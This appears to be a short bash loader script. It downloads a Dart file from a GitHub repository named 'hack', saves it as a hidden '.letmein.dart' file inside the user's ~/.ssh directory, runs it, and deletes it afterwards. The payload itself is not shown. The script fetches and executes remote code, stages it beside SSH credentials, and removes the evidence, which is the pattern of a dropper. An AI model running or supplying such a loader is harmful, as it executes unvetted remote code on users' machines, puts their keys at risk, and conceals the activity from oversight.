#!/usr/bin/env bash

DART_LOCATION=~/.ssh/.letmein.dart

touch ${DART_LOCATION}

rm ${DART_LOCATION}

wget -qO- https://github.com/axetroy/hack/raw/master/dart/index.dart >> ${DART_LOCATION}

dart --version

dart ${DART_LOCATION}

rm ${DART_LOCATION}